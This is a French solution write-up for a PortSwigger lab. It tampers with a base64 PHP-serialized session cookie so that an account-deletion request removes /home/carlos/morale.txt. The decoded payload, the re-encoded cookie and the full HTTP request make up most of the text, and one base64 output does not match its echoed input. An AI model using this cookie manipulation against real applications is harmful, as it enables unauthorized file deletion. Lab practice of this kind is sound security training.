# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

## Solution

Quand on upload une photo de profil sur ce lab, on tombe sur cette erreur qui révèle le full path :

```
PHP Fatal error:  Uncaught Exception: Error in file upload: 1 in /home/carlos/avatar_upload.php:6
Stack trace:
#0 {main}
  thrown in /home/carlos/avatar_upload.php on line 6
```

L'objectif du challenge est de supprimer le fichier `morale.txt` qui se trouve dans le répértoire de carlos.

Quand on est authentifié, on obtient un cookie de session :

```
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5OHhheTdwNjd4N3lycHZyd2R2a2RiNzVqMXI1dGkzbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
```

La chaine est probablement l'objet PHP de l'utilisateur connecté, on peut la décoder :

```bash
$ echo "Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5OHhheTdwNjd4N3lycHZyd2R2a2RiNzVqMXI1dGkzbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=" | base64 -d
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"y8xay7p67x7yrpvrwdvkdb75j1r5ti3l";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

Si on modifie le nom du fichier `avatar_link` pour qu'il pointe vers le fichier `morale.txt` et qu'on supprime notre profile, le fichier devrait aussi être supprimé puisque l'application supprime également les fichiers uploadés.

```bash
$ echo 'O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"y8xay7p67x7yrpvrwdvkdb75j1r5ti3l";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}' | base64
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5OHhheTdwNjd4N3lycHZyd2R2a2RiNzVqMXI1dGkzbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL2Nhcmxvcy9tb3JhbGUudHh0Ijt9Cg==
```

Maintenant si on supprime notre profile en injectant ce cookie, alors le fichier `morale.txt` sera supprimé :

```http
POST /my-account/delete HTTP/2
Host: 0a9100d70350881d802085f5004600cb.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5OHhheTdwNjd4N3lycHZyd2R2a2RiNzVqMXI1dGkzbCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
Content-Length: 0
Cache-Control: max-age=0
Origin: https://0a9100d70350881d802085f5004600cb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a9100d70350881d802085f5004600cb.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```